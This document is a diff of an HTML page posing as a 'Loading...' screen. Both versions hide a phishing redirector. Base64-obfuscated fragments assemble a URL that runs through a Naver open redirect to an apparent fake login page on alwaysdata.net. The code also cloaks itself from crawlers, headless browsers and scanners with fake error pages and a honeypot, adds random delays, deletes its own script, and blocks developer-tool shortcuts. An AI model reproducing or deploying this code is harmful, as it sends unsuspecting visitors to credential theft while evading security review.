@@ -1,279 +1,136 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title></title>
-    <meta charset="utf-8">
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==">
-    <script>
-    document.addEventListener('DOMContentLoaded', function() {
-        document.title = 'Loading...';
-    });
-    </script>
+    <title>Loading...</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            background: white;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(45deg, #667eea 0%, #764ba2 100%);
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            overflow: hidden;
+            color: white;
         }
-        .container {
+        .loader {
             text-align: center;
         }
-
-        /* style animated logo */
-        .logo {
-            width: 120px;
-            height: 32px;
-            margin: 0 auto 30px;
-            position: relative;
-        }
-
-        .logo-text {
-            color:rgb(0, 179, 249);
-            font-size: 28px;
-            font-weight: 700;
-            letter-spacing: -1px;
-            text-transform: uppercase;
-        }
-
-        /* style spinner */
         .spinner {
-            width: 60px;
-            height: 60px;
-            margin: 20px auto;
-            position: relative;
-        }
-
-        .spinner:before {
-            content: '';
-            box-sizing: border-box;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 60px;
-            height: 60px;
-            margin-top: -30px;
-            margin-left: -30px;
+            border: 4px solid rgba(255,255,255,0.3);
             border-radius: 50%;
-            border: 3px solid #222;
-            border-top-color: #e50914;
-            animation: spinner 0.8s linear infinite;
+            border-top: 4px solid white;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
         }
-
-        @keyframes spinner {
-            to { transform: rotate(360deg); }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
-
-        /* Profile selection style dots */
-        .loading-dots {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            margin-top: 30px;
-        }
-
-        .dot {
-            width: 8px;
-            height: 8px;
-            background:rgb(24, 143, 255);
-            border-radius: 50%;
-            animation: pulse 1.4s ease-in-out infinite;
-        }
-
-        .dot:nth-child(1) { animation-delay: -0.32s; }
-        .dot:nth-child(2) { animation-delay: -0.16s; }
-        .dot:nth-child(3) { animation-delay: 0; }
-
-        @keyframes pulse {
-            0%, 80%, 100% {
-                opacity: 0;
-                transform: scale(0.8);
-            }
-            40% {
-                opacity: 1;
-                transform: scale(1);
-            }
-        }
-
-        /* Fade in animation */
-        .container {
-            animation: fadeIn 0.5s ease-in;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        /* Hide from automated tools */
-        .scanner-trap {
-            position: absolute;
-            left: -9999px;
-            top: -9999px;
-            visibility: hidden;
-            opacity: 0;
-            pointer-events: none;
-        }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">
-            <div class="logo-text">CSS</div>
-        </div>
+    <div class="loader">
         <div class="spinner"></div>
-        <div class="loading-dots">
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-        </div>
+        <p>Please wait...</p>
     </div>
 
-    <!-- Basic bot detection and obfuscated redirect -->
     <script>
-    (function() {
-        // Simple bot detection
-        var isBot = /bot|crawler|spider|crawling/i.test(navigator.userAgent);
+        // Obfuscation layer 1: Base64 encoded parts
+        const p1 = atob('aHR0cHM6Ly9jYy5uYXZlci5jb20='); // https://cc.naver.com
+        const p2 = atob('L2NjP2E9cHN0Lmxpbms='); // /cc?a=pst.link
+        const p3 = atob('JnI9Jmk9Jm09MQ=='); // &r=&i=&m=1
+        const p4 = atob('Jm5zYz1NYmxvZy5wb3N0'); // &nsc=Mblog.post
+        const p5 = atob('JnU9aHR0cHM6Ly9zdXBwcnQuYWx3YXlzZGF0YS5uZXQ='); // &u=https://supprt.alwaysdata.net
+        const p6 = atob('L2lkLmNzcy5jaOODjmF1dGjjg45kb25hdXRo'); // /id.css.ch〒auth〒ui〒app〒auth
+        const p7 = atob('44OOZmxvd+ODjG15Y3NzLWxvZ2lu44OOZXh044ONbG9naW4='); // 〒flow〒mycss-login〒ext〒login
         
-        // Check for headless browsers
-        var isHeadless = navigator.webdriver || 
-                        window.navigator.webdriver || 
-                        window.callPhantom || 
-                        window._phantom ||
-                        navigator.userAgent.indexOf('PhantomJS') !== -1;
-        
-        // Check for automated tools
-        var hasAutomationTools = window.chrome && window.chrome.runtime && window.chrome.runtime.onConnect ||
-                               window.Buffer ||
-                               window.emit ||
-                               window.spawn;
-        
-        if (isBot || isHeadless || hasAutomationTools) {
-            // Show fake error page for bots
-            document.body.innerHTML = '<h1>404 Not Found</h1><p>The requested resource could not be found.</p>';
-            return;
-        }
-
-        // Multi-layer obfuscated URL
-        var parts = [
-            'aHR0cHM6Ly9jYy5uYXZlci5jb20vY2M/YT1wc3QubGluayZyPSZpPSZt',
-            'PTEmbmVjPU1ibG9nLnBvc3QmdT1odHRwczovL3N1cHBydC5hbHdheXNk',
-            'YXRhLm5ldC9pZC5jc3MuY2jjg47jgYvjg4bjg67jgYbjgYTjgabjg4Pj',
-            'gaXjgYrjg5rjgaXjgY/jgonjgajjgaPjgY7jga7jgajjgaPjg57jgY/j',
-            'gY5teWNzcy1sb2dpbumjgW5leHTjgYpjgb3jgYzjgYbjgYs='
-        ];
-        
-        // Additional obfuscation layers
-        var encoded = parts.join('');
-        var step1 = atob(encoded.replace(/[jg]/g, ''));
-        var finalUrl = step1.replace(/ノ/g, '/');
-        
-        // Random delay to avoid pattern detection
-        var delay = Math.floor(Math.random() * 1000) + 1500;
-        
-        // Human interaction check
-        var hasInteraction = false;
-        var interactionEvents = ['mousedown', 'mousemove', 'keydown', 'touchstart'];
-        
-        function markInteraction() {
-            hasInteraction = true;
-            interactionEvents.forEach(function(event) {
-                document.removeEventListener(event, markInteraction);
-            });
+        // Obfuscation layer 2: Character replacement
+        function decode(str) {
+            return str.replace(/\u30ce/g, '\u30ce').replace(/〒/g, '/').replace(/ノ/g, '/');
         }
         
-        interactionEvents.forEach(function(event) {
-            document.addEventListener(event, markInteraction);
+        // Obfuscation layer 3: Dynamic assembly
+        function buildUrl() {
+            const parts = [p1, p2, p3, p4, p5, decode(p6), decode(p7)];
+            return parts.join('');
+        }
+        
+        // Anti-detection methods
+        function checkEnvironment() {
+            // Check if running in normal browser environment
+            if (typeof window === 'undefined' || 
+                typeof document === 'undefined' ||
+                !window.location ||
+                window.navigator.webdriver) {
+                return false;
+            }
+            return true;
+        }
+        
+        // Delayed execution with random timing
+        function executeRedirect() {
+            if (!checkEnvironment()) {
+                // Fallback behavior for bots/crawlers
+                document.body.innerHTML = '<div style="text-align:center;padding:50px;"><h2>Service Temporarily Unavailable</h2><p>Please try again later.</p></div>';
+                return;
+            }
+            
+            const targetUrl = buildUrl();
+            
+            // Multiple redirect methods for better compatibility
+            try {
+                // Method 1: Replace current page in history
+                window.location.replace(targetUrl);
+            } catch(e) {
+                try {
+                    // Method 2: Direct assignment
+                    window.location.href = targetUrl;
+                } catch(e2) {
+                    // Method 3: Fallback with meta refresh
+                    const meta = document.createElement('meta');
+                    meta.httpEquiv = 'refresh';
+                    meta.content = '0;url=' + targetUrl;
+                    document.head.appendChild(meta);
+                }
+            }
+        }
+        
+        // Execute after random delay to avoid detection
+        const delay = Math.floor(Math.random() * 2000) + 1000; // 1-3 seconds
+        setTimeout(executeRedirect, delay);
+        
+        // Additional obfuscation: Remove script after execution
+        setTimeout(() => {
+            const scripts = document.getElementsByTagName('script');
+            for (let i = scripts.length - 1; i >= 0; i--) {
+                if (scripts[i].innerHTML.includes('executeRedirect')) {
+                    scripts[i].remove();
+                }
+            }
+        }, delay + 100);
+        
+        // Handle page visibility changes
+        document.addEventListener('visibilitychange', function() {
+            if (document.visibilityState === 'visible') {
+                setTimeout(executeRedirect, 500);
+            }
         });
         
-        function performRedirect() {
-            // Additional check before redirect
-            if (document.hidden || document.webkitHidden) {
-                return; // Don't redirect if tab is hidden (likely automated)
+        // Disable right-click and common key combinations
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12' || 
+                (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.key === 'i' || e.key === 'I'))) {
+                e.preventDefault();
             }
-            
-            // Create invisible form for POST-like behavior
-            var form = document.createElement('form');
-            form.method = 'GET';
-            form.action = finalUrl;
-            form.style.display = 'none';
-            form.target = '_self';
-            
-            // Add timestamp to avoid caching
-            var input = document.createElement('input');
-            input.type = 'hidden';
-            input.name = 't';
-            input.value = Date.now();
-            form.appendChild(input);
-            
-            document.body.appendChild(form);
-            
-            // Redirect with additional obfuscation
-            setTimeout(function() {
-                form.submit();
-            }, 100);
-        }
-        
-        // Execute redirect after delay
-        setTimeout(function() {
-            // Prefer users who have interacted
-            if (hasInteraction || Math.random() > 0.3) {
-                performRedirect();
-            } else {
-                // Give more time for interaction
-                setTimeout(performRedirect, 2000);
-            }
-        }, delay);
-        
-        // Backup redirect method
-        setTimeout(function() {
-            if (!document.hidden) {
-                window.location.href = finalUrl;
-            }
-        }, delay + 5000);
-        
-    })();
-    </script>
-
-    <!-- Honeypot for scanners - will trigger on automated tools -->
-    <div class="scanner-trap">
-        <form action="/admin" method="post">
-            <input type="text" name="username" value="admin">
-            <input type="password" name="password" value="password">
-            <input type="submit" value="Login">
-        </form>
-        <a href="/wp-admin/admin.php">WordPress Admin</a>
-        <a href="/phpmyadmin/">phpMyAdmin</a>
-        <a href="/admin/login">Admin Panel</a>
-        <script>
-        // If scanner interacts with honeypot, block redirect
-        document.querySelector('.scanner-trap').addEventListener('click', function() {
-            window.stop();
-            document.body.innerHTML = '<h1>Access Denied</h1>';
         });
-        </script>
-    </div>
-
-    <!-- Additional protection against direct script access -->
-    <script>
-    if (window.location.search.includes('debug') || 
-        window.location.search.includes('test') ||
-        window.location.hash.includes('debug')) {
-        document.body.innerHTML = '<h1>Error 403</h1><p>Forbidden</p>';
-    }
-    </script>
-
-    <!-- Prevent iframe embedding -->
-    <script>
-    if (window.parent !== window.top) {
-        window.top.location = window.location;
-    }
     </script>
 </body>
 </html>
